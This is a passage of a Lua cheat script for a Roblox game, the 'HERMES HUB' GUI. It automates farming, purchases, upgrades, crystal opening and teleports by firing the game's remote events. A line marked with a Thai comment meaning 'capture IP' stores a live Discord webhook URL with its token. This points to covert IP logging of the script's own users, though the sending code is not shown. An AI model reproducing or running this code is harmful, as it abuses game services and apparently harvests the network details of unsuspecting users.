...
NameReal.BackgroundTransparency = 1
NameReal.BorderSizePixel = 0
NameReal.Position = UDim2.new(0.5, 0, 0.9895, 0)
NameReal.AnchorPoint = Vector2.new(0.5, 0.5)
NameReal.Size = UDim2.new(0, 5000, 0, 3400)
NameReal.Font = Enum.Font.GothamBold
NameReal.Text = "HERMES HUB V1.0.2"
NameReal.TextColor3 = _G.Color
...
--        TextButton_3_Toggle.BorderColor3 = Color3.fromRGB(249, 53, 139)
        ...
        TextButton_4_Toggle.Parent = TextButton_3_Toggle
        TextButton_4_Toggle.BackgroundColor3 = Color3.fromRGB(155, 155,155)
--        _G.Color = Color3.fromRGB(249, 53, 139)
        TextButton_4_Toggle.BorderSizePixel = 0
        TextButton_4_Toggle.AnchorPoint = Vector2.new(0.5, 0.5)
        TextButton_4_Toggle.Position = UDim2.new(0.5, 0, 0.5, 0)
        TextButton_4_Toggle.Size = UDim2.new(0, 27, 0, 27-2)
...
ScolDown.CanvasSize = UDim2.new(0,0,0,UIListLayoutlist.AbsoluteContentSize.Y + 10  )
    ...
    function items:TextBox(text,text2,callback)
        ...
        FrameBox.Size = UDim2.new(0, 200, 0, 30)
        ...
        TextFrame.MouseEnter:Connect(function()
            TweenService:Create(
                FrameBox,
                TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Size = UDim2.new(0, 200, 0, 30)} -- UDim2.new(0, 128, 0, 25)
            ):Play()
            TweenService:Create(
                TextFrame2,
                TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
...
local Window = create:Win("HERMES HUB")
local Tap1 = Window:Taps("Main")
local Tap2 = Window:Taps("Teleport")
local Tap3 = Window:Taps("Misc")
...
---ดักip
_G.webhooksdiscord = "https://discord.com/api/webhooks/919518004088307712/ig6AjTu_UsVvHTG2ZSW7igsBZz-uL4oTqLDZl4xjshzvk8zTDaZfIo2lQCg-Iy1IhFvy"
...
page1:Toggle("Auto Farm",false,function(Farm)
_G.AutoFarm = Farm
...
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(69.670997619629, 20.575277328491, -47.780689239502)
end
end)

---AutoBuy
page1:Label("Auto Buy")
page1:Toggle("AutoBuy Sword", nil, function(sword)
   _G.AutobuySword = sword
while _G.AutobuySword do wait()
local args = {
   [1] = "buyAllSwords",
   [2] = "Ground"
}
...
page1:Toggle("AutoBuy Belts", nil, function(belts)
   _G.Autobuybelts = belts
while _G.Autobuybelts do wait()
local args = {
    [1] = "buyAllBelts",
    [2] = "Ground"
}
...
---AutoUpgradeSkill
page2:Label("Auto UpgradeSkill")
page2:Toggle("Auto UpgradeSkill", nil, function(skill)
    _G.autoupskill = skill
    while _G.Autoupskill do wait()
    local args = {
        [1] = "buyAllSkills",
        [2] = "Ground"
    }
...
page2:Toggle("Auto Shurikens", nil, function(Shurikens)
_G.AutoupShurikens = Shurikens
while _G.AutoupShurikens do wait()
local args = {
        [1] = "buyAllShurikens",
        [2] = "Ground"
    }
...
---AutoCrystal
page2:Label("Auto Crystal")
page2:Toggle("AutoBlueCrystal", nil, function(Blue)
    _G.AutoBlue = Blue
    while _G.AutoBlue do wait()
    local args = {
        [1] = "openCrystal",
        [2] = "Blue Crystal"
    }
...
page2:Toggle("AutoPurpleCrystal", nil, function(Purple)
    _G.AutoPurple = Purple
    while _G.AutoPurple do wait()
    local args = {
        [1] = "openCrystal",
        [2] = "Purple Crystal"
    }
...
---pet
page2:Label("AutoEvolve")
page2:Toggle("AutoEvolve", nil, function(pet)
    _G.AutoEvole = pet
    while _G.AutoEvole do wait()
    local args = {
        [1] = "autoEvolvePets"
    }
...
page1:Label("Teleport")
page2:Label("Islands")

---Teleport
page1:Button("Sell", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112.98033905029, 19.643665313721, 29.785074234009)
end)
page1:Button("Shop", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(115.46876525879, 20.5888671875, 34.911067962646)
end)
page1:Button("Skill", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(74.500350952148, 20.981395721436, 100.11599731445)
end)
page1:Button("Blue Crystal", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9.3444490432739, 3.0999987125397, 99.283172607422)
end)
page1:Button("Purple Crystal", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-51.577114105225, 3.0999987125397, -30.616729736328)
end)
page1:Button("Ultra Shockwave Crystal", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-115.60411071777, 3.0651116371155, -88.953773498535)
end)
page1:Button("Light Skill", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-121.74131011963, 3.0999987125397, 10.228830337524)
end)
page1:Button("Dark Skill", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117.1148223877, 3.0999987125397, 51.458618164062)
end)
page1:Button("Group Rewards", function ()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-59.507705688477, 9.7439222335815, 183.17402648926)
end)

---page3

local page1 = Tap3:newpage()
local page2 = Tap3:newpage()
...
---code
page1:Button("RedeemCodes", function()
   print("RedeemCode success")
   local args = {
       [1] = "zenmaster15K"
   }
...
---Trade Disabled
page1:Button("Trade Disabled", function()
   local args = {
   [1] = "disableTrading"
}
game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer(unpack(args))
print("Trade Disabled success")
end)
page1:Button("Trade Enabled", function()
local args = {
   [1] = "enableTrading"
}
game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer(unpack(args))
print("Trade Enabled success")
end)

---Credit
page1:Button("Credit : Dion#9389", function()
setclipboard("Dion#9389")
end)



---Update
page2:Button("UPDATE 1.0.2", function()
end)
   page2:Button("Add Auto Farm", function()
   end)
   page2:Button("Add Auto Buy", function()
   end)
   page2:Button("Add Auto Upgrade", function()
   end)
   page2:Button("Add Teleport", function()
   end)
   page2:Button("Add Redeem Codes", function()
   end)
   page2:Button("Add Trade Enabled", function()
   end)
   page2:Button("Add Trade Disabled", function()
   end)
